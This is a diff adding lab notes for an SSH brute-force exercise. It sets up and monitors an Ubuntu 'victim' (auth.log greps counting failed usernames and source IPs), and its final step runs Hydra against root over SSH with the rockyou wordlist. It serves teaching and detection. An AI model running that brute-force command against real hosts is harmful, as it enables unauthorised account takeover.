@@ -1,0 +1,34 @@
+# === Ubuntu (Victim Machine) ===
+
+## 1. Check SSH status (install if needed)
+sudo systemctl status ssh
+sudo apt update
+sudo apt install openssh-server -y
+
+## 2. Enable and start SSH service
+sudo systemctl enable ssh
+sudo systemctl start ssh
+
+## 3. Check IP address of victim machine
+ip a
+
+## 4. Monitor logs in real time
+sudo tail -f /var/log/auth.log
+
+## 5. Find failed password attempts
+sudo grep "Failed password" /var/log/auth.log
+
+## 6. Count usernames tried in brute force
+sudo grep "Failed password" /var/log/auth.log | awk '{print $(NF-5)}' | sort | uniq -c | sort -nr
+
+## 7. Count IP addresses from which failed attempts occurred
+sudo grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr
+
+# === Kali (Attacker Machine) ===
+
+## 8. Install Hydra if not already installed
+sudo apt update
+sudo apt install hydra -y
+
+## 9. Run brute force attack with Hydra
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<TARGET-IP> -t 4 -vV
